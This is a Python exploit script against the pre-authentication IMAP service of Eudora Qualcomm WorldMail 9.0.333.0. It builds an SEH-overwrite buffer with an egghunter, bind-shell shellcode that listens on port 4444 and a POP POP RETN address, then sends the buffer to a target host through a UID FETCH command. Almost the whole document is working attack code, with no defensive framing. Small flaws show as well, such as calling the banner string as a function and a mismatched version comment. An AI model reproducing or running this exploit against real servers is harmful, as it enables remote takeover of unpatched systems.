#!/usr/bin/python
# Tested on 6.1.19.0

import sys,socket
 



banner = """
   
####################################################################################
###                                                                              ###
###        Coded by: Muhammad ELHarmeel    @0xhandler          ###
###                                                                              ###
####################################################################################

*************************************************************************************  
* Details:                                                                          *
*                                                                                   *
* - PRE AUTHENTICATION Eudora Qualcomm WorldMail 9.0.333.0 IMAPd Service            *
*   Preauthentication Buffer Overflow.                                              *
* - Tested on: Windows Server 2003 SP1.                                             *
* - SEH gets overwritten at 749 bytes when using UID command.                       *
* Only 79 bytes left after SEH, So the shellcode was placed before SEH              *
* and backward jump is used after SEH to execute the shellcode.                     *
* - Shellcode: shell_bind_tcp LPORT*4444 EXITFUNC*seh , Bad charcters are 0x00 0x7b *
*************************************************************************************

"""


print banner



if len(sys.argv)!=3:
        banner()
        print "\nUsage: ./worldmail_uid.py <IP> <PORT>\n"
        sys.exit(0)




egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7" # this is the marker/tag: w00t

shellcode = "w00tw00t" + ("\xb8\x3b\xe5\xd0\x36\xda\xd3\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x56\x31\x42\x13\x83\xc2\x04\x03\x42\x34\x07\x25\xca\xa2\x4e"
"\xc6\x33\x32\x31\x4e\xd6\x03\x63\x34\x92\x31\xb3\x3e\xf6\xb9"
"\x38\x12\xe3\x4a\x4c\xbb\x04\xfb\xfb\x9d\x2b\xfc\xcd\x21\xe7"
"\x3e\x4f\xde\xfa\x12\xaf\xdf\x34\x67\xae\x18\x28\x87\xe2\xf1"
"\x26\x35\x13\x75\x7a\x85\x12\x59\xf0\xb5\x6c\xdc\xc7\x41\xc7"
"\xdf\x17\xf9\x5c\x97\x8f\x72\x3a\x08\xb1\x57\x58\x74\xf8\xdc"
"\xab\x0e\xfb\x34\xe2\xef\xcd\x78\xa9\xd1\xe1\x75\xb3\x16\xc5"
"\x65\xc6\x6c\x35\x18\xd1\xb6\x47\xc6\x54\x2b\xef\x8d\xcf\x8f"
"\x11\x42\x89\x44\x1d\x2f\xdd\x03\x02\xae\x32\x38\x3e\x3b\xb5"
"\xef\xb6\x7f\x92\x2b\x92\x24\xbb\x6a\x7e\x8b\xc4\x6d\x26\x74"
"\x61\xe5\xc5\x61\x13\xa4\x81\x46\x2e\x57\x52\xc0\x39\x24\x60"
"\x4f\x92\xa2\xc8\x18\x3c\x34\x2e\x33\xf8\xaa\xd1\xbb\xf9\xe3"
"\x15\xef\xa9\x9b\xbc\x8f\x21\x5c\x40\x5a\xe5\x0c\xee\x34\x46"
"\xfd\x4e\xe4\x2e\x17\x41\xdb\x4f\x18\x8b\x6a\x48\xd6\xef\x3f"
"\x3f\x1b\x10\xae\xe3\x92\xf6\xba\x0b\xf3\xa1\x52\xee\x20\x7a"
"\xc5\x11\x03\xd6\x5e\x86\x1b\x30\x58\xa9\x9b\x16\xcb\x06\x33"
"\xf1\x9f\x44\x80\xe0\xa0\x40\xa0\x6b\x99\x03\x3a\x02\x68\xb5"
"\x3b\x0f\x1a\x56\xa9\xd4\xda\x11\xd2\x42\x8d\x76\x24\x9b\x5b"
"\x6b\x1f\x35\x79\x76\xf9\x7e\x39\xad\x3a\x80\xc0\x20\x06\xa6"
"\xd2\xfc\x87\xe2\x86\x50\xde\xbc\x70\x17\x88\x0e\x2a\xc1\x67"
"\xd9\xba\x94\x4b\xda\xbc\x98\x81\xac\x20\x28\x7c\xe9\x5f\x85"
"\xe8\xfd\x18\xfb\x88\x02\xf3\xbf\xb7\xf3\xc9\x55\x2f\xaa\xb8"
"\x17\x2d\x4d\x17\x5b\x48\xce\x9d\x24\xaf\xce\xd4\x21\xeb\x48"
"\x05\x58\x64\x3d\x29\xcf\x85\x14")


buffer   = "A" * 292                    #Junk
buffer  +=  shellcode                   #Shellcode of 368 bytes to spawn a shell listening on port 4444 
buffer  += "\x90" *81                   #Nop Sled to fill the rest of the buffer after the shellcode 
buffer  += "\xEB\x06\x90\x90"           #Short JMP of 6 bytes.
buffer  += "\x95\xcb\x0d\x60"           #Memory Address of POP POP RETN sequence at module MsccMgr.dll @ windows server 2003.
buffer  += egghunter                    #Egg hunter to search for the tag "w00tw00t" and executes the code after it
buffer  += "}" *32                      #Junk



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((sys.argv[1],int(sys.argv[2])))
except:
	print "Can\'t connect to server!\n"
	sys.exit(0)



print "[+] Connecting to victim !"
data=s.recv(1024)
print "[+] "+data.rstrip()
print "[+] Sending evil buffer..."
s.send('A013 UID FETCH 4827313:4827313 '+ buffer + "\r\n")
s.close()
print "[+] Exploitation Successful\n"
print "[+] Please Connect to port 4444 on victim IP now !\n"